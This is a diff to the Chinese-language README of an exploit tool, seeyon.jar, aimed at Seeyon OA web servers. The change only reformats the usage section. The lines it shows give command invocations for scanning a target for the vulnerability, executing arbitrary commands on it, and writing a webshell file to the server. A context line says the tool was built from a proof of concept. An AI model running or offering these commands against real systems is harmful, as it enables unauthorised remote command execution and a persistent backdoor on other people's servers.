@@ -18,9 +18,9 @@ V0.1 根据POC写出初步利用，可以执行命令，但是仅在windows与ht
 
 ### 0x01 使用方法
 
-无损检验是否存在漏洞：java -jar seeyon.jar scan 
+无损检验是否存在漏洞：java -jar seeyon.jar scan http/https://xxxx.com:port/seeyon 
 
-http/https://xxxx.com:port/seeyon 执行命令：java -jar seeyon.jar http/https://xxxx.com:port/seeyon cmd 
+执行命令：java -jar seeyon.jar http/https://xxxx.com:port/seeyon cmd 
 
 写入shell：java -jar seeyon.jar http/https://xxxx.com:port/seeyon shell srcFile desFile 
 
